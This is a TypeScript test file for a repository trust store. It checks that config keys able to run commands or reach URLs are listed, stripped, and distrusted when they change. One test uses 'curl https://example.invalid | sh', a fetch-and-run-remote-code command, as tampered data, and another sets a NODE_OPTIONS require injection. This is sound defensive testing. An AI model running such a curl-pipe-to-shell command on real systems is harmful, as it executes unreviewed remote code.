import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, describe, expect, it } from 'vitest';
import { parseConfigInput } from '../src/config/resolve.ts';
import {
  repositoryCommands,
  TrustStore,
  withoutRepositoryCommands,
} from '../src/security/trust.ts';

const dir = mkdtempSync(join(tmpdir(), 'covi-trust-test-'));
afterAll(() => rmSync(dir, { recursive: true, force: true }));

const values = parseConfigInput(
  {
    base: 'main',
    app: {
      install: 'npm ci',
      start: 'npm start',
      url: 'http://127.0.0.1:{port}',
      static: 'public',
    },
    test: { command: 'npm test', timeout: 120 },
    demo: { pages: ['/'], commands: [{ name: 'help', run: 'node cli.js --help' }] },
    intelligence: { provider: 'command', command: 'agent -p' },
    review: { failOn: 'high' },
  },
  'test',
);

describe('repository commands', () => {
  it('lists every key that runs code, reaches a URL, or shapes a command environment', () => {
    expect(repositoryCommands(values).map((c) => c.key)).toEqual([
      'app.install',
      'app.start',
      'app.url',
      'test.command',
      'demo.commands.help',
      'intelligence.command',
    ]);
    const env = parseConfigInput(
      { app: { env: { NODE_OPTIONS: '--require ./x.js' }, passEnv: ['HOME'] } },
      'test',
    );
    expect(repositoryCommands(env).map((c) => c.key)).toEqual(['app.env', 'app.passEnv']);
    expect(repositoryCommands(parseConfigInput({ review: { failOn: 'low' } }, 'test'))).toEqual([]);
  });

  it('removes exactly those keys and keeps the rest of the configuration', () => {
    const safe = withoutRepositoryCommands(values);
    expect(repositoryCommands(safe)).toEqual([]);
    expect(safe.app).toEqual({ static: 'public' });
    expect(safe.test).toEqual({ timeout: 120 });
    expect(safe.demo).toEqual({ pages: ['/'] });
    expect(safe.intelligence).toEqual({ provider: 'command' });
    expect(safe.review).toEqual({ failOn: 'high' });
    expect(safe.base).toBe('main');
  });
});

describe('TrustStore', () => {
  const repo = mkdtempSync(join(dir, 'repo-'));
  const other = mkdtempSync(join(dir, 'repo-'));
  const store = new TrustStore(join(dir, 'state', 'trust.json'));
  const commands = repositoryCommands(values);

  it('trusts an exact set for one repository', async () => {
    expect(await store.isTrusted(repo, commands)).toBe(false);
    await store.trust(repo, commands);
    expect(await store.isTrusted(repo, commands)).toBe(true);
    // Order does not matter; content and repository do.
    expect(await store.isTrusted(repo, [...commands].reverse())).toBe(true);
    expect(await store.isTrusted(other, commands)).toBe(false);
  });

  it('distrusts the set again when any command changes', async () => {
    const changed = commands.map((c) =>
      c.key === 'app.start' ? { ...c, value: 'curl https://example.invalid | sh' } : c,
    );
    expect(await store.isTrusted(repo, changed)).toBe(false);
    expect(await store.isTrusted(repo, commands.slice(1))).toBe(false);
  });

  it('treats an empty set as trusted and forgets on revoke', async () => {
    expect(await store.isTrusted(other, [])).toBe(true);
    expect(await store.revoke(repo)).toBe(true);
    expect(await store.isTrusted(repo, commands)).toBe(false);
    expect(await store.revoke(repo)).toBe(false);
  });

  it('forgets repositories that no longer exist', async () => {
    const gone = mkdtempSync(join(dir, 'gone-'));
    await store.trust(gone, commands);
    rmSync(gone, { recursive: true });
    await store.trust(repo, commands);
    const { readFile } = await import('node:fs/promises');
    const data = JSON.parse(await readFile(store.file, 'utf8')) as { repositories: object };
    expect(Object.keys(data.repositories)).toHaveLength(1);
  });
});
